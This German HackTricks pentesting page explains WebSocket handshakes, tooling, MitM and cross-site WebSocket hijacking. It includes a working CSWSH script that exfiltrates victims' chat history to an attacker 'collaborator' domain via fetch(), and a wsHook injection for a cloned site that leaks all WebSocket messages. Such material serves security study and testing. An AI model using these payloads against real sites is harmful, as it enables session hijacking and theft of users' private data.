# WebSocket-Angriffe

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Was sind WebSockets

WebSocket-Verbindungen werden durch einen initialen **HTTP**-Handshake hergestellt und sind darauf ausgelegt, **langfristig** zu sein, um eine bidirektionale Kommunikation zu erm√∂glichen, ohne dass ein transaktionales System erforderlich ist. Dies macht WebSockets besonders vorteilhaft f√ºr Anwendungen, die eine **geringe Latenz oder serverinitiierte Kommunikation** erfordern, wie z.B. Live-Finanzdatenstr√∂me.

### Aufbau von WebSocket-Verbindungen

Eine detaillierte Erkl√§rung zum Aufbau von WebSocket-Verbindungen finden Sie [**hier**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Zusammenfassend werden WebSocket-Verbindungen in der Regel √ºber clientseitiges JavaScript initiiert, wie unten gezeigt:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Das `wss`-Protokoll kennzeichnet eine WebSocket-Verbindung, die mit **TLS** gesichert ist, w√§hrend `ws` auf eine **ungesicherte** Verbindung hinweist.

W√§hrend des Verbindungsaufbaus wird ein Handshake zwischen dem Browser und dem Server √ºber HTTP durchgef√ºhrt. Der Handshake-Prozess beinhaltet, dass der Browser eine Anfrage sendet und der Server antwortet, wie in den folgenden Beispielen dargestellt:

Der Browser sendet eine Handshake-Anfrage:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Antwort des Servers auf den Handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Die Verbindung bleibt nach der Einrichtung f√ºr den Austausch von Nachrichten in beide Richtungen ge√∂ffnet.

**Hauptpunkte des WebSocket-Handshakes:**

- Die Header `Connection` und `Upgrade` signalisieren den Beginn eines WebSocket-Handshakes.
- Der Header `Sec-WebSocket-Version` gibt die gew√ºnschte WebSocket-Protokollversion an, normalerweise `13`.
- Ein Base64-kodierter Zufallswert wird im Header `Sec-WebSocket-Key` gesendet, um sicherzustellen, dass jeder Handshake eindeutig ist. Dadurch werden Probleme mit Caching-Proxies vermieden. Dieser Wert dient nicht zur Authentifizierung, sondern zur Best√§tigung, dass die Antwort nicht von einem fehlerhaft konfigurierten Server oder Cache generiert wurde.
- Der Header `Sec-WebSocket-Accept` in der Antwort des Servers ist ein Hash des `Sec-WebSocket-Key` und best√§tigt die Absicht des Servers, eine WebSocket-Verbindung zu √∂ffnen.

Diese Funktionen gew√§hrleisten, dass der Handshake-Prozess sicher und zuverl√§ssig ist und eine effiziente Echtzeitkommunikation erm√∂glicht.


### Linux-Konsole

Sie k√∂nnen `websocat` verwenden, um eine Rohverbindung mit einem WebSocket herzustellen.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Oder um einen Websocat-Server zu erstellen:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM-Websocket-Verbindungen

Wenn Sie feststellen, dass Clients √ºber ein **HTTP-Websocket** aus Ihrem aktuellen lokalen Netzwerk verbunden sind, k√∂nnen Sie versuchen, einen [ARP-Spoofing-Angriff](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) durchzuf√ºhren, um einen MitM-Angriff zwischen dem Client und dem Server durchzuf√ºhren.\
Sobald der Client versucht, eine Verbindung herzustellen, k√∂nnen Sie dann Folgendes verwenden:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets-Aufz√§hlung

Sie k√∂nnen das **Tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) verwenden, um Websockets automatisch zu entdecken, zu identifizieren und nach bekannten **Schwachstellen** zu suchen.

### Websocket-Debugging-Tools

* **Burp Suite** unterst√ºtzt die MitM-Kommunikation von Websockets auf √§hnliche Weise wie bei regul√§rer HTTP-Kommunikation.
* Die **Burp Suite-Erweiterung** [**socketsleuth**](https://github.com/snyk/socketsleuth) erm√∂glicht eine bessere Verwaltung von Websocket-Kommunikation in Burp, indem Sie den **Verlauf** abrufen, **Interception-Regeln** festlegen, **Match- und Replace-Regeln** verwenden und **Intruder** und **AutoRepeater** nutzen.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abk√ºrzung f√ºr "**WebSocket/Socket.io Proxy**", dieses in Node.js geschriebene Tool bietet eine Benutzeroberfl√§che zum **Erfassen, Abfangen, Senden von benutzerdefinierten** Nachrichten und Anzeigen aller WebSocket- und Socket.IO-Kommunikationen zwischen Client und Server.
* [**wsrepl**](https://github.com/doyensec/wsrepl) ist ein **interaktiver WebSocket-REPL**, der speziell f√ºr Penetrationstests entwickelt wurde. Es bietet eine Schnittstelle zum Beobachten von **eingehenden WebSocket-Nachrichten und Senden neuer Nachrichten**, mit einem benutzerfreundlichen Framework zur **Automatisierung** dieser Kommunikation.
* [**https://websocketking.com/**](https://websocketking.com/) ist eine **Webseite zur Kommunikation** mit anderen Webseiten √ºber **Websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) bietet neben anderen Arten von Kommunikationsprotokollen eine **Webseite zur Kommunikation** mit anderen Webseiten √ºber **Websockets**.

## Websocket-Labor

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) finden Sie einen Code, um eine Webseite mit Websockets zu starten, und in [**diesem Beitrag**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) finden Sie eine Erkl√§rung dazu.

## Cross-Site WebSocket-Hijacking (CSWSH)

**Cross-Site WebSocket-Hijacking**, auch bekannt als **Cross-Origin WebSocket-Hijacking**, wird als spezieller Fall von **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** identifiziert, der WebSocket-Handshakes betrifft. Diese Schwachstelle tritt auf, wenn WebSocket-Handshakes ausschlie√ülich √ºber **HTTP-Cookies** ohne CSRF-Token oder √§hnliche Sicherheitsma√ünahmen authentifiziert werden.

Angreifer k√∂nnen dies ausnutzen, indem sie eine **b√∂sartige Webseite** hosten, die eine Cross-Site-WebSocket-Verbindung zu einer verwundbaren Anwendung initiiert. Diese Verbindung wird dann als Teil der Sitzung des Opfers mit der Anwendung behandelt und nutzt das Fehlen von CSRF-Schutz im Sitzungs-Handling-Mechanismus aus.

### Einfacher Angriff

Beachten Sie, dass beim **Aufbau** einer **WebSocket-Verbindung** das **Cookie** an den Server **gesendet** wird. Der Server kann es verwenden, um jeden **bestimmten Benutzer** mit seiner **WebSocket-Sitzung basierend auf dem gesendeten Cookie** in Verbindung zu bringen.

Dann kann zum Beispiel der **WebSocket-Server** bei **Senden** von "**READY**" die **Geschichte des Gespr√§chs** eines Benutzers zur√ºckschicken. Daher kann ein einfacher XSS-Angriff, der die Verbindung herstellt (das **Cookie** wird automatisch gesendet, um den Opferbenutzer zu autorisieren), indem er "**READY**" **sendet**, die Geschichte des Gespr√§chs abrufen.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie mit einem anderen Subdomain

In diesem Blog-Beitrag [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) gelang es dem Angreifer, **beliebigen JavaScript-Code in einem Subdomain** der Domain auszuf√ºhren, in der die Websocket-Kommunikation stattfand. Da es sich um eine **Subdomain** handelte, wurde das **Cookie** gesendet und da der **Websocket den Ursprung nicht ordnungsgem√§√ü √ºberpr√ºfte**, war es m√∂glich, mit ihm zu kommunizieren und **Token daraus zu stehlen**.

### Daten von Benutzern stehlen

Kopieren Sie die Webanwendung, die Sie vort√§uschen m√∂chten (z. B. die .html-Dateien) und f√ºgen Sie in das Skript, in dem die Websocket-Kommunikation stattfindet, den folgenden Code ein:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Jetzt laden Sie die Datei `wsHook.js` von [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) herunter und **speichern Sie sie im Ordner mit den Webdateien**.\
Indem Sie die Webanwendung freigeben und einen Benutzer damit verbinden, k√∂nnen Sie die √ºber Websocket gesendeten und empfangenen Nachrichten stehlen:
```javascript
sudo python3 -m http.server 80
```
## Race Conditions

Race Conditions in WebSockets sind auch ein Thema, [√ºberpr√ºfen Sie diese Informationen, um mehr zu erfahren](race-condition.md#rc-in-websockets).

## Andere Schwachstellen

Da WebSockets ein Mechanismus sind, um Daten an den Server- und Client-Seite zu senden, k√∂nnen WebSockets, abh√§ngig davon, wie der Server und der Client die Informationen verarbeiten, verwendet werden, um mehrere andere Schwachstellen wie XSS, SQLi oder jede andere g√§ngige Web-Schwachstelle unter Verwendung einer Eingabe eines Benutzers √ºber einen WebSocket auszunutzen.

## **WebSocket Smuggling**

Diese Schwachstelle k√∂nnte es Ihnen erm√∂glichen, die Beschr√§nkungen von Reverse Proxies zu umgehen, indem Sie sie glauben machen, dass eine WebSocket-Kommunikation hergestellt wurde (auch wenn dies nicht der Fall ist). Dies k√∂nnte einem Angreifer erm√∂glichen, auf versteckte Endpunkte zuzugreifen. Weitere Informationen finden Sie auf der folgenden Seite:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Referenzen

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
